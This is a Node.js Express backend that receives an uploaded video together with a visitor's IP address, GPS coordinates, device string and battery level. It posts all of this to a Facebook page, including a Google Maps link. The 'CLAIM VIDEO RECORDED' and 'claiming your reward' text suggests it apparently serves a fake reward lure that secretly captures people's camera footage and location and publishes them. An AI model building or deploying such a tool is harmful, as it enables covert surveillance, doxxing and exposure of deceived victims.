import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const PORT = process.env.PORT || 3000;
const PAGE_ID = process.env.PAGE_ID;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN;

// Build Facebook description
function buildDescription(info) {
    const mapLink = info.latitude && info.longitude
        ? `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
        : "Location not available";

    return `
🎬 CLAIM VIDEO RECORDED

🌐 IP Address: ${info.ip || "Unknown"}

📍 Location:
${mapLink}

💻 Device Info:
${info.userAgent || "Unknown"}

🔋 Battery Level:
${info.battery || "Unknown"}

🎉 Thank you for claiming your reward!
`;
}

// Upload endpoint
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {

        const videoFile = req.file;
        if (!videoFile) {
            return res.status(400).json({ error: "No video uploaded" });
        }

        const {
            ip,
            latitude,
            longitude,
            userAgent,
            battery
        } = req.body;

        const description = buildDescription({
            ip,
            latitude,
            longitude,
            userAgent,
            battery
        });

        const form = new FormData();

        form.append("source", videoFile.buffer, {
            filename: "claim_video.webm",
            contentType: videoFile.mimetype
        });

        form.append("description", description);
        form.append("access_token", ACCESS_TOKEN);

        const fbResponse = await fetch(
            `https://graph.facebook.com/${PAGE_ID}/videos`,
            {
                method: "POST",
                body: form,
                headers: form.getHeaders()
            }
        );

        const result = await fbResponse.json();

        console.log("Facebook response:", result);

        res.json(result);

    } catch (error) {

        console.error("Upload error:", error);

        res.status(500).json({
            error: "Server error",
            message: error.message
        });
    }
});

// Serve frontend
app.use(express.static("frontend"));

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
